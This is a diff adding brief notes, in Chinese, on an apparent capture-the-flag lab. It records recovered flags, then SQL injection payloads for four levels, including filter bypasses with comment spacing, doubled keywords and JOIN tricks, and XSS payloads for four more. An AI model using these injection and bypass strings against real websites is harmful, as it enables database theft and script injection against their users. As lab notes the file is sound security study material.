@@ -1,0 +1,77 @@
+qwe
+flag{e10adc3949ba59abbe56e057f20f883e}   //第一关
+
+sql2
+flag{ZmxhZ3tlYXN5fQ==}      //第二关
+flag{ZmxhZ3tlYXN5fQ==}
+
+sql3
+flag{flag{it is very hard}}    //sqlmap
+flag{%66%6C%61%67%7B%69%74%20%69%73%20%76%65%72%79%20%68%61%72%64%7D}  //第三关
+
+targetsys
+targetsys
+flag{e10adc3949ba59abbe56e057f20f883e}
+
+第一关
+1' order by 1#
+1' order by 2#
+1' order by 3# //报错，所以order by猜解得到的列数为2,判断字段数为2
+
+判断回显点,有两个回显点
+1' union select 1,2#
+
+查询当前数据库版本,查询当前数据库名
+1' union select version(),database()# 
+
+查询当前数据库 表名
+1' union select 1,table_name from information_schema.tables where table_schema=database()# 
+1' union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1#
+1' union select 1,table_name from information_schema.tables where table_schema=database() limit 1,1#
+1' union select 1,table_name from information_schema.tables where table_schema=database() limit 2,1#
+
+查询字段名
+1' union select 1,column_name from information_schema.columns where table_schema=database() and table_name='flag'#
+
+查询字段内容
+1' union select 1,flag from flag#
+
+第二关 过滤空格，select
+1'/**/order/**/by/**/1#
+1'/**/order/**/by/**/2#
+1'/**/union/**/Select/**/1,2#
+1'/**/union/**/selselectect/**/1,2#
+1'/**/union/**/selselectect/**/version(),database()#
+1'/**/union/**/Select/**/1,table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
+1'/**/union/**/Select/**/1,column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='flag'#
+1'/**/union/**/Select/**/*/**/from/**/flag#
+
+第三关 过滤空格，select,逗号
+1'/**/order/**/by/**/1#
+1'/**/order/**/by/**/2#
+1'/**/union/**/Select/**/*/**/from/**/((Select/**/1)A/**/JOIN/**/(Select/**/2)B)#
+1'/**/union/**/Select/**/*/**/from/**/((Select/**/1)A/**/JOIN/**/(Select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database())B)#
+1'/**/union/**/Select/**/*/**/from/**/((Select/**/1)A/**/JOIN/**/(Select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='flag')B)#
+1'/**/union/**/Select/**/*/**/from/**/flag#
+
+第四关 
+1' order by 1#
+1' order by 2#
+1' order by 3#
+1' order by 4#报错，所以order by猜解得到的列数为3,判断字段数为3
+1' union select 1,2,3#
+1' union select 1,2,table_name from information_schema.tables where table_schema=database()#
+1' union select 1,2,column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='flag'#
+1' union select 1,2,flag from flag#
+
+第五关 xss1
+admin=<script>alert('k0sec')</script>
+
+第六关 xss2
+admin'onmouseover='alert("k0sec")'
+
+第七关 xss3
+"><a href=" 'k0sec')">k0sec</a >
+
+第八关 xss4
+"><a hhrefref="javasscriptcript:alert('k0sec')">k0sec</a >
